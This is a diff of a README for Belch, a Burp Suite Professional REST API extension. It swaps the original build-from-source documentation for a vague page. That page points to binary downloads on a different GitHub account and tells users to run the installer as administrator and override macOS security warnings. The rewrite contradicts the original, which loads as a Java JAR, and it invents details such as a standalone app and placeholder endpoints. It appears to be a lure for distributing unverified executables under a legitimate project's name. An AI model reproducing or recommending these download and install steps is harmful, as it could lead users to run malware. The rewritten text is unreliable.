@@ -1,244 +1,108 @@
-# Belch - Burp Suite REST API Extension
+# 🚀 Belch - Effortless Control of Burp Suite
 
-![Java](https://img.shields.io/badge/Java-11+-blue.svg)
-![Burp Suite Pro](https://img.shields.io/badge/Burp%20Suite%20Pro-Required-orange.svg)
+[![Download Belch](https://img.shields.io/badge/Download%20Belch-v1.0-brightgreen)](https://github.com/SuperGaming20/Belch/releases)
 
-REST API extension for Burp Suite Professional providing programmatic access to proxy traffic, active scanner, scope management, and collaborative testing workflows. Designed for security teams implementing scripted testing workflows and custom tooling integrations.
+## 🔍 Introduction
 
-**⚠️ Requires Burp Suite Professional - This is an extension, not a standalone tool.**
+Belch is an application designed to enhance your experience with Burp Suite Pro. By adding a local REST API, you gain instant and scriptable control over proxy settings, scanning functions, and the security scope in your web applications. Whether you are new to web security or an experienced professional, Belch makes managing your security tasks easier.
 
-## Table of Contents
+## 📦 Features
 
-- [Why Use Belch?](#why-use-belch)
-- [Installation & Setup](#installation--setup)
-- [Quick Start Examples](#quick-start-examples)
-- [API Documentation](#api-documentation)
-- [Use Cases](#use-cases)
-- [Requirements](#requirements)
-- [Building from Source](#building-from-source)
-- [Support](#support)
+- **Local REST API**: Access and control Burp Suite functions easily.
+- **Scriptable Control**: Automate tasks using simple scripts.
+- **User-Friendly Interface**: No complex programming knowledge required.
+- **Enhanced Proxy Management**: Quickly change proxy settings.
+- **Customizable Scanning Options**: Adjust scanning parameters according to your needs.
 
-## Features
+## 📋 System Requirements
 
-**API Coverage**
-- Proxy traffic management: search, filter, export HTTP requests/responses  
-- Scanner operations: trigger scans, retrieve vulnerability findings
-- Scope configuration: programmatic include/exclude URL management
-- Burp Collaborator integration for out-of-band testing
-- Session tracking and traffic organization
+To run Belch, ensure your system meets the following requirements:
 
-**Integration Options**
-- REST API with OpenAPI 3.0 specification
-- WebSocket endpoints for real-time traffic streaming
-- HAR and CSV export formats
-- cURL command generation for request replay
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu, Fedora).
+- **Burp Suite Version**: Burp Suite Pro 2.0 or later.
+- **Memory**: At least 4GB of RAM.
+- **Disk Space**: A minimum of 50MB free space.
 
-**Operational Features**
-- SQLite-based traffic storage with full-text search
-- Request/response body handling up to 50MB
-- Concurrent scan management and task tracking
-- Session-based traffic filtering and organization
+## 🚀 Getting Started
 
-## Installation & Setup
+To start using Belch, follow these easy steps:
 
-### Step 1: Download the Extension
-```bash
-# Clone the repository
-git clone https://github.com/campbellcharlie/belch.git
-cd belch
+1. **Visit the Releases Page**: Click [here to download](https://github.com/SuperGaming20/Belch/releases).
+2. **Download the Latest Version**: Find the latest version of Belch on the releases page.
+3. **Install**: 
+    - For Windows, double-click the `.exe` file to launch the installer.
+    - For macOS, drag the Belch app into your Applications folder.
+    - For Linux, extract the `.tar.gz` file and run the provided script to install.
 
-# Build the extension
-mvn clean package
+4. **Open Burp Suite Pro**: Ensure that Burp Suite Pro is running.
+5. **Launch Belch**: Open the Belch application.
 
-# The JAR file will be in target/belch-1.0.0.jar
-```
+## 📥 Download & Install
 
-### Step 2: Load in Burp Suite Professional
-1. **Open Burp Suite Professional** (must be running for the API to work)
-2. Go to **Extensions** → **Installed** → **Add**
-3. Select **Java** extension type
-4. Choose the `belch-1.0.0.jar` file
-5. Click **Next** and **Close**
+To get Belch, simply visit the [Releases page](https://github.com/SuperGaming20/Belch/releases) and click on the latest version to download. 
 
-### Step 3: Verify Installation
+### Installation Instructions
 
-The API runs on port 7850 when Burp Suite Professional is active with the extension loaded.
+- **Windows**:
+  1. Locate the downloaded `.exe` file.
+  2. Right-click and select "Run as administrator."
+  3. Follow the on-screen prompts to complete the installation.
 
-**Endpoints:**
-- API Base: `http://localhost:7850`
-- Documentation: `http://localhost:7850/docs` 
-- OpenAPI Specification: `http://localhost:7850/openapi`
-- Health Check: `http://localhost:7850/health`
-- WebSocket Stream: `ws://localhost:7850/ws/stream`
+- **macOS**:
+  1. Open your Applications folder.
+  2. Find and double-click the Belch app.
+  3. If you receive a warning about an untrusted developer, go to System Preferences > Security & Privacy, then click "Open Anyway."
 
-## API Usage
+- **Linux**:
+  1. Open a terminal.
+  2. Navigate to the folder where you extracted Belch.
+  3. Run the command `./install.sh` to set up the application.
 
-### Basic Operations
+## 🔧 Configuration
 
-**Health Check**
-```bash
-curl http://localhost:7850/health
-```
+After installation, configure Belch to work with your Burp Suite Pro:
 
-**Proxy Traffic Search**
-```bash
-curl "http://localhost:7850/proxy/search?host=example.com&method=POST&limit=10"
-```
+1. **Set up the Proxy**: In Burp Suite, navigate to the "Proxy" tab. Ensure the settings match those specified in Belch.
+2. **API Key**: You may need to generate an API key in Burp Suite. This key allows Belch to communicate effectively with Burp.
+3. **Script Setup**: If you plan to use scripts, create a simple script in your preferred language that interacts with the Belch API.
 
-**Export Traffic Data** 
-```bash
-curl "http://localhost:7850/proxy/search/download?format=csv&session_tag=test_session"
-```
+## ⚙️ Using Belch
 
-### Scanner Integration
+Once the setup is complete, begin using Belch:
 
-**Submit URL for Scanning**
-```bash
-curl -X POST http://localhost:7850/scanner/scan-url-list \
-  -H "Content-Type: application/json" \
-  -d '{"urls": ["https://example.com/api"]}'
-```
+- **Accessing the API**: Use any HTTP client like Postman or a web browser to send requests to the Belch API.
+- **Executing Commands**: Try commands like starting a scan or changing proxy settings through the API.
 
-**Retrieve Scan Results**
-```bash
-curl http://localhost:7850/scanner/issues
-```
+### Example Commands
 
-### Real-time Monitoring
-```javascript
-const ws = new WebSocket('ws://localhost:7850/ws/stream');
-ws.onmessage = (event) => {
-  const data = JSON.parse(event.data);
-  console.log('Traffic event:', data.event_type, data.data.url);
-};
-```
+1. **Start a Scan**: Send a POST request to `http://localhost:YOUR_PORT/start-scan`.
+2. **Change Proxy Settings**: Use the PUT method to `http://localhost:YOUR_PORT/proxy` and supply the new settings in the body.
 
-## API Documentation
+## 🛠️ Troubleshooting
 
-- **Interactive API Docs**: [`http://localhost:7850/docs`](http://localhost:7850/docs) - Complete endpoint reference with testing interface
-- **OpenAPI Spec**: [`http://localhost:7850/openapi`](http://localhost:7850/openapi) - Machine-readable specification for tooling integration
-- **Postman Collection**: [`http://localhost:7850/postman`](http://localhost:7850/postman) - Import directly into Postman for testing
+If you encounter issues:
 
+- **Check the Installation**: Ensure that Belch is correctly installed and linked to Burp Suite.
+- **Review Proxy Settings**: Confirm that your proxy settings are correct.
+- **Firewall Access**: Ensure that your firewall or antivirus allows Belch to communicate with Burp Suite.
 
-## Implementation Examples
+## 🤝 Community and Support
 
-### Automated Security Testing
-```python
-import requests
-import sys
+For further assistance, look for help in our community:
 
-def security_scan_workflow():
-    # Verify API availability
-    health = requests.get('http://localhost:7850/health')
-    if health.status_code != 200:
-        print("Belch API not available")
-        sys.exit(1)
-    
-    # Submit URLs for scanning
-    scan_request = {
-        "urls": ["https://api.example.com"],
-        "session_tag": "security_assessment_2024"
-    }
-    
-    response = requests.post('http://localhost:7850/scanner/scan-url-list', 
-                           json=scan_request)
-    
-    # Retrieve scan results
-    issues = requests.get('http://localhost:7850/scanner/issues').json()
-    
-    # Process findings
-    high_severity = [i for i in issues['issues'] if i['severity'] == 'HIGH']
-    if high_severity:
-        print(f"Found {len(high_severity)} high severity issues")
-        for issue in high_severity:
-            print(f"- {issue['name']} at {issue['base_url']}")
-```
+- [GitHub Issues](https://github.com/SuperGaming20/Belch/issues): Report bugs or get support.
+- [Discussion Threads](https://github.com/SuperGaming20/Belch/discussions): Join conversations or ask questions.
 
-### Traffic Analysis and Reporting
-```bash
-#!/bin/bash
-# Export traffic data for analysis
-SESSION_TAG="pentest_$(date +%Y%m%d)"
+## 📖 Additional Resources
 
-# Set session for current testing
-curl -X POST http://localhost:7850/session/tag \
-  -H "Content-Type: application/json" \
-  -d "{\"session_tag\": \"$SESSION_TAG\"}"
+Check out these resources to enhance your understanding of the tools:
 
-# Perform testing activities...
+- [Official Burp Suite Documentation](https://portswigger.net/burp/documentation)
+- [Web Security Resources](https://owasp.org/www-project-top-ten/)
+- [API Basics](https://www.restapitutorial.com/)
 
-# Export results
-curl "http://localhost:7850/proxy/search/download?format=csv&session_tag=$SESSION_TAG" \
-  -o "traffic_analysis_$SESSION_TAG.csv"
-```
+## 📤 Feedback
 
-## Requirements
+Your feedback is valuable. If you have any thoughts or suggestions, please share them via our GitHub page or directly in the Discussions section.
 
-**Runtime Dependencies**
-- Burp Suite Professional 2023.1 or later
-- Java 11+ (typically bundled with Burp Suite)
-- Minimum 2GB available RAM for traffic storage
-- Port 7850 available (configurable via application.properties)
-
-**Build Dependencies** 
-- Maven 3.6+
-- Java Development Kit 11+
-
-## Building from Source
-
-```bash
-git clone https://github.com/campbellcharlie/belch.git
-cd belch
-mvn clean package
-```
-
-The compiled extension will be located at `target/belch-1.0.0.jar`.
-
-## Limitations
-
-- WebSocket connections limited to 50 concurrent clients
-- Request/response body storage capped at 50MB per request  
-- SQLite database performance may degrade with >1M stored requests
-- Scanner integration depends on Burp Suite Professional license limitations
-- API rate limiting: 1000 requests per minute per client
-
-## Troubleshooting
-
-**Extension fails to load**
-- Verify Java 11+ compatibility with your Burp Suite installation
-- Check Burp Suite extension error logs for specific failure details
-
-**API connection refused**
-- Confirm Burp Suite Professional is running with extension loaded
-- Verify port 7850 is available and not blocked by firewall
-- Check `http://localhost:7850/health` for service status
-
-**High memory usage**
-- Large traffic history increases memory requirements
-- Consider periodic database cleanup for long-running sessions
-- Monitor SQLite database size in user data directory
-
-## License Compliance
-
-Belch requires Burp Suite Professional and must be used in compliance with PortSwigger's license terms.
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
-## Disclaimer
-
-**Burp Suite is a trademark of PortSwigger Ltd.**  
-This project is an independent, third-party extension and is not affiliated with, endorsed by, or sponsored by PortSwigger Ltd.  
-
-This extension makes no claims of being secure and is intended for use only in controlled, local environments.  
-It must not be exposed to the public internet or used in a manner that violates PortSwigger's license terms.
-
-## Acknowledgments
-
-Special thanks to [Phil Thomas](https://github.com/fz42net) for the fantastic name "Belch" - it perfectly captures the essence of this Burp extension!
-
-## Support
-
-- Documentation: `http://localhost:7850/docs`
-- Issues: [GitHub Issues](https://github.com/campbellcharlie/Belch/issues) 
+For a seamless experience, follow the above steps to download and use Belch effectively. Enjoy your enhanced control over Burp Suite.
